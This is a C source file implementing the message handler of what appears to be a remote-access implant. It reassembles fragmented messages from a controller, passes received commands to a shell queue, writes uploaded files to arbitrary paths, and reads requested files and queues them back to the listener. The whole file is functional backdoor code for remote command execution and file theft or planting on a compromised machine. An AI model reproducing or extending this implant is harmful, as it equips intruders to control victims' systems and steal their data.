#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <signal.h>

#include <arpa/inet.h>

#include "queue.h"
#include "implant.h"
#include "utility.h"
#include "agent_handler.h"

// Globals
extern Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
extern Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;
extern Queue* shell_receive_queue;
extern pthread_mutex_t shell_receive_queue_lock;
extern Queue* shell_send_queue;
extern pthread_mutex_t shell_send_queue_lock;
// SIGINT flags
extern volatile sig_atomic_t agent_close_flag;
// Connected flag
extern volatile sig_atomic_t agent_disconnect_flag;

STATIC int agent_handle_command(Assembled_Message* a_message){
	Queue_Message* message = malloc(sizeof(Queue_Message));
	memset(message, 0, sizeof(Queue_Message));
	
	message->size = a_message->last_header.total_size;
	message->buffer = a_message->message;
	
	debug_print("%s\n", "enqueing command request");
	enqueue(shell_send_queue, &shell_send_queue_lock, message);

	return 0;
}

STATIC int agent_handle_put_file_name(Assembled_Message* a_message){

	a_message->file_name = a_message->message;
	a_message->message = NULL;

	debug_print("Put file name: %s\n", a_message->file_name);

	return RET_OK;
}

STATIC int agent_handle_put_file(Assembled_Message* a_message){
	FILE* file_fd;

	// TODO check if path exists
	if ((file_fd = fopen(a_message->file_name, "wb")) == 0){
		printf("ERROR file open\n");
		return RET_ERROR;
	}

	if (writeall(file_fd, a_message->message, a_message->last_header.total_size) != RET_OK){
		printf("ERROR fwrite\n");
		return RET_ERROR;
	}

	debug_print("Put file: %s, size: %d\n", a_message->file_name, a_message->last_header.total_size);

	fclose(file_fd);
	free(a_message->message);
	free(a_message->file_name);

	return RET_OK;
}

STATIC int agent_handle_get_file_name(Assembled_Message* a_message){
	FILE* file_fd;
	int file_size, bytes_read, file_name_size;
	char *file_buffer, *file_name_buffer, *slash_ptr;
	const char slash = '/';

	if (access(a_message->message, F_OK)){
		debug_print("%s\n", "File doesn't exist");
		//TODO send status message
		return RET_OK;
	}

	if ((file_fd = fopen(a_message->message, "rb")) == 0){
		printf("ERROR file open\n");
		return RET_ERROR;
	}

	if (fseek(file_fd, 0L, SEEK_END) == -1){
		printf("ERROR fseek\n");
		return RET_ERROR;
	}
	if ((file_size = ftell(file_fd)) == -1){
		printf("ERROR ftell\n");
		return RET_ERROR;
	}
	rewind(file_fd);

	file_buffer = malloc(file_size);

	bytes_read = fread(file_buffer, 1, file_size, file_fd);
	if (bytes_read != file_size || ferror(file_fd)){
		printf("ERROR fread\n");
		return RET_ERROR;
	}
	
	fclose(file_fd);

	// remove path from file name when sending to listener
	if ((slash_ptr = strrchr(a_message->message, slash)) == NULL){
		debug_print("Get file: %s, size: %d\n", a_message->message, file_size);
		agent_prepare_message(TYPE_GET_FILE_NAME, a_message->message, a_message->current_message_size);
	}
	else{
		// start at next character after last forward slash
		slash_ptr++;
		file_name_size = strlen(slash_ptr);
		file_name_buffer = calloc(1, file_name_size + 1);
		memcpy(file_name_buffer, slash_ptr, file_name_size);

		debug_print("Get file: %s, size: %d\n", file_name_buffer, file_size);
		agent_prepare_message(TYPE_GET_FILE_NAME, file_name_buffer, file_name_size + 1);
		free(a_message->message);
		a_message = NULL;
	}
	agent_prepare_message(TYPE_GET_FILE, file_buffer, file_size);

	return RET_OK;
}

STATIC int agent_parse_first_fragment(Assembled_Message* a_message, Fragment* fragment, int size){

	// check if this is a first fragment
	if (fragment->header.index != 0){
		debug_print("Expected first fragment but got: %d\n", fragment->header.index);
		return RET_ORDER;
	}

	// check if this fragment contains no data
	if (size != HEADER_SIZE){
		debug_print("Expected first fragment size 0 but got: %d\n", size);
		return RET_ORDER;
	}

	debug_print("Handling first fragment: type: %d\n", fragment->header.type);

	// save fragment to agent struct
	memcpy(&a_message->last_header, fragment, HEADER_SIZE);
	
	// allocate memory for total message
	a_message->message = calloc(1, fragment->header.total_size);

	// record current size of message
	a_message->current_message_size = 0;

	return RET_OK;
}

STATIC int agent_parse_next_fragment(Assembled_Message* a_message, Fragment* fragment, int size){

	// check if this fragment matches the next expected sized
	if (size - HEADER_SIZE != a_message->last_header.next_size){
		debug_print("Expected fragment size: %d, but got: %d\n", size - HEADER_SIZE, a_message->last_header.next_size);
		return RET_ORDER;
	}

	// check if type, checksum, and index match
	if (fragment->header.type != a_message->last_header.type || \
		fragment->header.checksum != a_message->last_header.checksum || \
		fragment->header.index != a_message->last_header.index + 1){
		debug_print("Unexpected fragment: type: %d, checksum: %d, index: %d\n", \
			fragment->header.type, \
			fragment->header.checksum, \
			fragment->header.index);
		return RET_ORDER;
	}
	
	// copy payload to end of message buffer
	memcpy(a_message->message + a_message->current_message_size, fragment->buffer, a_message->last_header.next_size);
	
	// update current size of message
	a_message->current_message_size += a_message->last_header.next_size;

	// update agent's last header
	memcpy(&a_message->last_header, fragment, HEADER_SIZE);

	return RET_OK;
}

int agent_handle_message_fragment(Assembled_Message* a_message, Queue_Message* q_message){
	int retval;

	// handle message type other than keep alive
	if (a_message->last_header.index == -1){
		retval = agent_parse_first_fragment(a_message, q_message->fragment, q_message->size);
	}
	else{
		retval = agent_parse_next_fragment(a_message, q_message->fragment, q_message->size);
	}

	return retval;
}

int agent_handle_complete_message(Assembled_Message* a_message){
	int ret_val = RET_OK;
	
	// check if we received all fragments
	if (a_message->last_header.index == -1 || a_message->last_header.total_size != a_message->current_message_size){
		return ret_val;
	}

	// check if checksum matches message
	//TODO

	switch(a_message->last_header.type){
		case TYPE_COMMAND:
			agent_handle_command(a_message);
			break;
		case TYPE_GET_FILE_NAME:
			agent_handle_get_file_name(a_message);
			break;
		case TYPE_PUT_FILE_NAME:
			agent_handle_put_file_name(a_message);
			break;
		case TYPE_PUT_FILE:
			agent_handle_put_file(a_message);
			break;
		case TYPE_RESTART_SHELL:
			debug_print("%s\n", "TYPE_RESTART_SHELL");
			break;
		case TYPE_CLOSE_AGENT:
			debug_print("%s\n", "TYPE_CLOSE_AGENT");
			agent_close_flag = true;
			break;
		default:
			printf("ERROR UNKNOWN MESSAGE TYPE: %d\n", a_message->last_header.type);
			ret_val = RET_ERROR;
	}

	// we are done processing message, reset agent index
	a_message->last_header.index = -1;

	return ret_val;
}

STATIC int agent_handle_message(Assembled_Message* a_message){
	int retval = RET_OK;
	Queue_Message* q_message;

	if (!(q_message = dequeue(agent_receive_queue, &agent_receive_queue_lock))) return RET_OK;
	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);

	retval = agent_handle_message_fragment(a_message, q_message);
	if (retval == RET_ORDER){
		a_message->last_header.index = -1;
		return RET_OK;
	}
	
	retval = agent_handle_complete_message(a_message);

	free(q_message->fragment);
	free(q_message);
	return retval;
}

int agent_prepare_message(int type, char* message, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0, index = 0;
	int this_size, next_size;

	// prepare first fragment. Only purpose is to prepare for next fragment size
	fragment = calloc(1, sizeof(Fragment));
	fragment->header.type = type;
	fragment->header.index = index++;
	fragment->header.total_size = message_size;
	fragment->header.checksum = 0;							// TODO
	
	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
	fragment->header.next_size = next_size;
	
	q_message = malloc(sizeof(Queue_Message));
	q_message->id = 0;
	q_message->size = HEADER_SIZE;
	q_message->fragment = fragment;

	enqueue(agent_send_queue, &agent_send_queue_lock, q_message);

	while (next_size > 0){
		this_size = next_size;

		// send remaining fragments
		fragment = calloc(1, sizeof(Fragment));
		fragment->header.type = type;
		fragment->header.index = index++;
		fragment->header.total_size = message_size;
		fragment->header.checksum = 0;							// TODO

		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
		fragment->header.next_size = next_size;
		memcpy(fragment->buffer, message + bytes_sent, this_size);
		
		q_message = malloc(sizeof(Queue_Message));
		q_message->id = 0;
		q_message->size = HEADER_SIZE + this_size;
		q_message->fragment = fragment;

		enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
		bytes_sent += this_size;
	}
	
	free(message);
	return RET_OK;	
}

void *agent_handler_thread(void *vargp){
	Assembled_Message assembled_message = {0};
	assembled_message.last_header.index = -1;

	debug_print("%s\n", "starting agent handler thread");

	while(!agent_close_flag && !agent_disconnect_flag){
		if (agent_handle_message(&assembled_message) != RET_OK){
			printf("agent_handler_thread error\n");
			agent_close_flag = true;
		}
	}

	debug_print("%s\n", "agent_handler_thread done");
	return 0;
}